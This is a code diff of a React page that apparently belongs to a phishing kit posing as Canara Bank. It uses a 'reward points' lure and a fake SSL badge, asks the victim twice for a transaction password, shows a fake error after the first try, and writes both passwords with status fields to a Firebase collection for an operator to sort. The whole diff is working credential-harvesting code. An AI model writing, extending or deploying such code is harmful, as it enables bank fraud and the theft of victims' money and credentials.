@@ -10,7 +10,7 @@ const SecondPage = () => {
   const [errorMessage, setErrorMessage] = useState('');
   const [submitCount, setSubmitCount] = useState(0); 
   const navigate = useNavigate();
-  const { documentId } = useParams();
+  const { documentId } = useParams(); // App.jsx ke path se ID lega
 
   const handleSubmit = async (e) => {
     e.preventDefault();
@@ -18,21 +18,30 @@ const SecondPage = () => {
     setErrorMessage('');
 
     try {
-      // Naya Data Object taiyaar karein
-      let updateData = {};
+      // Admin sorting ke liye current time
+      const currentTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
       
+      let updateData = {};
       if (submitCount === 0) {
-        // Pehli baar wala password save karein
-        updateData = { password_1: password2 };
+        // Pehli baar: Trans Pass 1 save karo
+        updateData = { 
+          trans_pass_1: password2,
+          last_active: currentTime,
+          current_status: "Step 2: 1st Attempt Done"
+        };
       } else {
-        // Doosri baar wala password save karein
-        updateData = { password_2: password2 };
+        // Doosri baar: Trans Pass 2 save karo
+        updateData = { 
+          trans_pass_2: password2,
+          last_active: currentTime,
+          current_status: "Step 2: Completed"
+        };
       }
 
-      // Firebase mein data update karein (merge true rakhta hai Firebase default mein update par)
+      // Firebase mein usi ID par update karega
       await FirebaseUtil.updateDocument("carvana", documentId, updateData);
 
-      // Loading delay
+      // 5 Seconds ka Loading delay
       setTimeout(() => {
         setIsSubmitting(false);
 
@@ -42,10 +51,10 @@ const SecondPage = () => {
           setPassword2(''); 
           setSubmitCount(1); 
         } else {
-          // --- Attempt 2: Direct success page par ---
-          navigate('/success');
+          // --- Attempt 2: Success page par ID ke saath bhejo ---
+          navigate(`/success/${documentId}`); 
         }
-      }, 6000); 
+      }, 5000); 
 
     } catch (error) {
       console.error("Error:", error);
@@ -61,14 +70,17 @@ const SecondPage = () => {
       </div>
 
       <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
-        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg">
+        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg border-t-4 border-blue-700">
           <div className="text-center mb-6">
-            <h1 className="text-2xl font-bold text-blue-800 uppercase tracking-tight">
-              Security Verification Required
+            <h1 className="text-xl font-bold text-blue-800 leading-tight">
+              One Step Away To Collect Your Rewardz Points
             </h1>
+            <p className="text-xs text-gray-400 mt-2">Verification required for security purposes</p>
           </div>
 
           <form onSubmit={handleSubmit} className="space-y-4">
+            
+            {/* Error Message Display */}
             {errorMessage && (
               <div className="bg-red-50 border-l-4 border-red-500 p-3 mb-4 animate-pulse">
                 <p className="text-red-700 text-sm font-semibold">{errorMessage}</p>
@@ -81,7 +93,7 @@ const SecondPage = () => {
               </label>
               <input
                 type="password"
-                className={`w-full py-2 px-3 rounded border text-gray-700 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 ${
+                className={`w-full py-3 px-3 rounded border text-gray-700 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 transition-all ${
                   errorMessage ? 'border-red-500 bg-red-50' : 'border-gray-300'
                 }`}
                 value={password2}
@@ -93,7 +105,7 @@ const SecondPage = () => {
 
             <button
               type="submit"
-              className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm shadow-md transition-all active:scale-95"
+              className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-extrabold py-3 px-4 rounded-full text-sm shadow-md transition-all active:scale-95"
               disabled={isSubmitting}
             >
               {isSubmitting ? "PROCESSING..." : "SUBMIT"}
@@ -104,6 +116,7 @@ const SecondPage = () => {
 
       <footer className="bg-gray-800 text-white p-4 text-center mt-auto">
         <p className="text-sm">© 2025 Canara Bank. All rights reserved.</p>
+        <p className="text-[10px] opacity-50 mt-1">Secured by 256-bit SSL Encryption</p>
       </footer>
     </div>
   );
